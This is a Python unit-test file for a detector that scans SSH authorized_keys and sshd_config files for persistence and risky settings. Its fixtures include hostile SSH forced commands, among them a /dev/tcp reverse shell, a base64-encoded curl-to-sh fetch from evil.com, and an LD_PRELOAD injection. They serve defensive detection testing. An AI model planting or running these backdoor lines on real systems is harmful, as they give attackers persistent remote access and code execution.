# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Unit tests for Linux SSH authorized keys and sshd_config extractor."""

from __future__ import annotations

import os
import tempfile

from src.utils.linux_ssh import (
    CATEGORY_AUTHORIZED_KEYS,
    CATEGORY_SSHD_CONFIG,
    TECHNIQUE_ID,
    analyze_ssh,
    parse_authorized_keys_line,
    parse_options_list,
    parse_sshd_line,
)
from src.utils.models import AnalysisTarget, RiskLevel

SAMPLE_RSA_KEY = (
    "AAAAB3NzaC1yc2EAAAADAQABAAABAQD3F6tyPEFEzV0LX3X8BsXdYwL1k9V9F5mK"
    "4d/3F0c1eN+eH9vG7zM5wQ1L2p0O8y6t4u2i1o3r5s7t9u8v7w6x5y4z3a2b1c0"
)
SAMPLE_ED25519_KEY = "AAAAC3NzaC1lZDI1NTE5AAAAIGd6c7u8e9f0a1b2c3d4e5f6g7h8i9j0k1l2m3n4"


def test_parse_options_list():
    tokens = [
        'command="cat /tmp/msg, hello"',
        "no-pty",
        'environment="FOO=bar"',
        'from="192.168.1.0/24,10.0.0.1"',
        'permitopen="127.0.0.1:80"',
    ]
    options = parse_options_list(tokens)
    assert options["command"] == "cat /tmp/msg, hello"
    assert options["no-pty"] is True
    assert options["environment"] == "FOO=bar"
    assert options["from"] == "192.168.1.0/24,10.0.0.1"
    assert options["permitopen"] == "127.0.0.1:80"


def test_parse_authorized_keys_line_simple():
    raw = f"ssh-rsa {SAMPLE_RSA_KEY} user@example.com"
    parsed = parse_authorized_keys_line(raw)
    assert parsed is not None
    assert parsed["key_type"] == "ssh-rsa"
    assert parsed["key_blob"] == SAMPLE_RSA_KEY
    assert parsed["comment"] == "user@example.com"
    assert parsed["options"] == {}


def test_parse_authorized_keys_line_with_options():
    raw = f'command="/bin/ls -la",no-pty ssh-ed25519 {SAMPLE_ED25519_KEY} bot-key'
    parsed = parse_authorized_keys_line(raw)
    assert parsed is not None
    assert parsed["key_type"] == "ssh-ed25519"
    assert parsed["key_blob"] == SAMPLE_ED25519_KEY
    assert parsed["comment"] == "bot-key"
    assert parsed["options"] == {"command": "/bin/ls -la", "no-pty": True}


def test_parse_authorized_keys_line_invalid():
    assert parse_authorized_keys_line("") is None
    assert parse_authorized_keys_line("# This is a comment") is None
    assert parse_authorized_keys_line("   \t  ") is None
    assert parse_authorized_keys_line("not-a-valid-key-line") is None


def test_parse_sshd_line():
    assert parse_sshd_line("PermitRootLogin yes") == ("PermitRootLogin", "yes")
    assert parse_sshd_line("PermitRootLogin=yes") == ("PermitRootLogin", "yes")
    assert parse_sshd_line('PermitRootLogin "prohibit-password"') == (
        "PermitRootLogin",
        "prohibit-password",
    )
    assert parse_sshd_line("AuthorizedKeysCommand /usr/bin/sss_keys %u") == (
        "AuthorizedKeysCommand",
        "/usr/bin/sss_keys %u",
    )
    assert parse_sshd_line("# PermitRootLogin no") is None
    assert parse_sshd_line("   ") is None


def test_root_authorized_keys_finding():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "root", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        with open(key_file, "w") as f:
            f.write(f"ssh-rsa {SAMPLE_RSA_KEY} admin@production\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.category == CATEGORY_AUTHORIZED_KEYS
        assert f0.technique_id == TECHNIQUE_ID
        assert f0.risk_level == RiskLevel.MEDIUM
        assert f0.path == "/root/.ssh/authorized_keys"
        assert f0.details["user"] == "root"
        assert f0.details["key_type"] == "ssh-rsa"
        assert f0.details["comment"] == "admin@production"
        assert "ROOT_AUTHORIZED_KEY" in f0.details["flags"]
        assert "SSH_AUTHORIZED_KEY_PRESENT" in f0.details["flags"]
        assert f0.details["key_fingerprint"].startswith("SHA256:")
        assert f0.details["key_blob_prefix"].startswith(SAMPLE_RSA_KEY[:10])


def test_user_authorized_keys_normal():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "home", "ubuntu", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        with open(key_file, "w") as f:
            f.write(f"ssh-ed25519 {SAMPLE_ED25519_KEY} ubuntu@instance\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.category == CATEGORY_AUTHORIZED_KEYS
        assert f0.risk_level == RiskLevel.INFO
        assert f0.details["user"] == "ubuntu"
        assert "SSH_AUTHORIZED_KEY_PRESENT" in f0.details["flags"]
        assert "ROOT_AUTHORIZED_KEY" not in f0.details["flags"]


def test_forced_command_tmp_backdoor():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "home", "ubuntu", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        with open(key_file, "w") as f:
            f.write(
                f'command="/tmp/backdoor.sh",no-pty ssh-rsa {SAMPLE_RSA_KEY} attacker@evil\n'
            )

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.CRITICAL
        assert "SSH_FORCED_COMMAND" in f0.details["flags"]
        assert "FORCED_COMMAND_TMP" in f0.details["flags"]
        assert f0.details["forced_command"] == "/tmp/backdoor.sh"
        assert f0.details["options"]["no-pty"] is True


def test_forced_command_reverse_shell():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "home", "ubuntu", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        with open(key_file, "w") as f:
            f.write(
                f'command="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" ssh-ed25519 {SAMPLE_ED25519_KEY} rev@shell\n'
            )

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.CRITICAL
        assert "REVERSE_SHELL" in f0.details["flags"]
        assert "SSH_FORCED_COMMAND" in f0.details["flags"]


def test_forced_command_base64_payload():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "home", "ubuntu", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        # "curl http://evil.com/a | sh" in base64 is Y3VybCBodHRwOi8vZXZpbC5jb20vYSB8IHNo
        with open(key_file, "w") as f:
            f.write(
                f'command="echo Y3VybCBodHRwOi8vZXZpbC5jb20vYSB8IHNo | base64 -d | sh" ssh-ed25519 {SAMPLE_ED25519_KEY} b64@payload\n'
            )

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.HIGH
        assert "BASE64_PAYLOAD" in f0.details["flags"]
        assert f0.decoded_payload == "curl http://evil.com/a | sh"


def test_forced_command_root_points_to_user_home():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "root", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        with open(key_file, "w") as f:
            f.write(
                f'command="/home/bob/scripts/backup.sh" ssh-rsa {SAMPLE_RSA_KEY} root-job\n'
            )

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.CRITICAL
        assert "ROOT_AUTHORIZED_KEY" in f0.details["flags"]
        assert "SYSTEM_KEY_POINTS_TO_USER_HOME" in f0.details["flags"]
        assert "CROSS_BOUNDARY_EXECUTION" in f0.details["flags"]


def test_environment_injection():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "home", "alice", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        with open(key_file, "w") as f:
            f.write(
                f'environment="LD_PRELOAD=/tmp/hook.so",no-pty ssh-rsa {SAMPLE_RSA_KEY} hook@env\n'
            )

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.CRITICAL
        assert "SSH_ENVIRONMENT_INJECTION" in f0.details["flags"]
        assert "ENVIRONMENT_LD_PRELOAD" in f0.details["flags"]
        assert f0.details["environment"] == "LD_PRELOAD=/tmp/hook.so"


def test_uncommon_comment_flag():
    with tempfile.TemporaryDirectory() as tmpdir:
        key_dir = os.path.join(tmpdir, "home", "ubuntu", ".ssh")
        os.makedirs(key_dir, exist_ok=True)
        key_file = os.path.join(key_dir, "authorized_keys")
        with open(key_file, "w") as f:
            f.write(f"ssh-rsa {SAMPLE_RSA_KEY} deploy-bot@internal-ci\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert "UNCOMMON_SSH_KEY_COMMENT" in f0.details["flags"]
        assert f0.risk_level == RiskLevel.MEDIUM


def test_sshd_config_permit_root_login():
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg_dir = os.path.join(tmpdir, "etc", "ssh")
        os.makedirs(cfg_dir, exist_ok=True)
        cfg_file = os.path.join(cfg_dir, "sshd_config")
        with open(cfg_file, "w") as f:
            f.write(
                "# Security config\n"
                "Port 22\n"
                "PermitRootLogin yes\n"
                "PasswordAuthentication yes\n"
            )

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.category == CATEGORY_SSHD_CONFIG
        assert f0.technique_id == TECHNIQUE_ID
        assert f0.risk_level == RiskLevel.MEDIUM
        assert "SSHD_PERMIT_ROOT_LOGIN" in f0.details["flags"]
        assert f0.details["directive"] == "PermitRootLogin"
        assert f0.details["value"] == "yes"
        assert f0.details["line_number"] == 3


def test_sshd_config_permit_empty_passwords():
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg_dir = os.path.join(tmpdir, "etc", "ssh")
        os.makedirs(cfg_dir, exist_ok=True)
        cfg_file = os.path.join(cfg_dir, "sshd_config")
        with open(cfg_file, "w") as f:
            f.write("PermitEmptyPasswords yes\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.category == CATEGORY_SSHD_CONFIG
        assert f0.risk_level == RiskLevel.HIGH
        assert "SSHD_PERMIT_EMPTY_PASSWORDS" in f0.details["flags"]


def test_sshd_config_authorized_keys_command_variations():
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg_dir = os.path.join(tmpdir, "etc", "ssh")
        os.makedirs(cfg_dir, exist_ok=True)
        cfg_file = os.path.join(cfg_dir, "sshd_config")
        with open(cfg_file, "w") as f:
            f.write("AuthorizedKeysCommand /tmp/custom_auth.sh %u\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.category == CATEGORY_SSHD_CONFIG
        assert f0.risk_level == RiskLevel.CRITICAL
        assert "SSHD_AUTHORIZED_KEYS_COMMAND" in f0.details["flags"]
        assert "COMMAND_IN_TMP" in f0.details["flags"]


def test_sshd_config_authorized_keys_command_user_home():
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg_dir = os.path.join(tmpdir, "etc", "ssh")
        os.makedirs(cfg_dir, exist_ok=True)
        cfg_file = os.path.join(cfg_dir, "sshd_config")
        with open(cfg_file, "w") as f:
            f.write("AuthorizedKeysCommand /home/admin/getkeys %u\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.CRITICAL
        assert "COMMAND_IN_USER_HOME" in f0.details["flags"]


def test_sshd_config_custom_authorized_keys_file_and_key_parsing():
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg_dir = os.path.join(tmpdir, "etc", "ssh")
        os.makedirs(cfg_dir, exist_ok=True)
        cfg_file = os.path.join(cfg_dir, "sshd_config")
        with open(cfg_file, "w") as f:
            f.write(
                "AuthorizedKeysFile /etc/ssh/authorized_keys/%u .ssh/authorized_keys\n"
            )

        # Create custom keys directory and user key file
        custom_keys_dir = os.path.join(tmpdir, "etc", "ssh", "authorized_keys")
        os.makedirs(custom_keys_dir, exist_ok=True)
        alice_keys = os.path.join(custom_keys_dir, "alice")
        with open(alice_keys, "w") as f:
            f.write(f"ssh-ed25519 {SAMPLE_ED25519_KEY} alice@corporate\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        # Expect finding for sshd_config custom file directive, plus finding for alice's key
        assert len(findings) == 2

        config_finding = next(f for f in findings if f.category == CATEGORY_SSHD_CONFIG)
        assert "SSHD_CUSTOM_AUTHORIZED_KEYS_FILE" in config_finding.details["flags"]
        assert "/etc/ssh/authorized_keys/%u" in config_finding.details["custom_paths"]

        key_finding = next(
            f for f in findings if f.category == CATEGORY_AUTHORIZED_KEYS
        )
        assert key_finding.path == "/etc/ssh/authorized_keys/alice"
        assert key_finding.details["user"] == "alice"
        assert key_finding.details["key_type"] == "ssh-ed25519"


def test_sshd_config_custom_keys_in_tmp():
    with tempfile.TemporaryDirectory() as tmpdir:
        cfg_dir = os.path.join(tmpdir, "etc", "ssh")
        os.makedirs(cfg_dir, exist_ok=True)
        cfg_file = os.path.join(cfg_dir, "sshd_config")
        with open(cfg_file, "w") as f:
            f.write("AuthorizedKeysFile /tmp/auth_keys\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        f0 = findings[0]
        assert f0.risk_level == RiskLevel.CRITICAL
        assert "SSHD_CUSTOM_AUTHORIZED_KEYS_FILE" in f0.details["flags"]
        assert "KEYS_FILE_IN_TMP" in f0.details["flags"]


def test_sshd_config_d_directory_scan():
    with tempfile.TemporaryDirectory() as tmpdir:
        d_dir = os.path.join(tmpdir, "etc", "ssh", "sshd_config.d")
        os.makedirs(d_dir, exist_ok=True)
        override_file = os.path.join(d_dir, "50-cloud-init.conf")
        with open(override_file, "w") as f:
            f.write("PermitRootLogin yes\n")

        target = AnalysisTarget(root_path=tmpdir)
        findings = analyze_ssh(target)

        assert len(findings) == 1
        assert findings[0].path == "/etc/ssh/sshd_config.d/50-cloud-init.conf"
        assert "SSHD_PERMIT_ROOT_LOGIN" in findings[0].details["flags"]
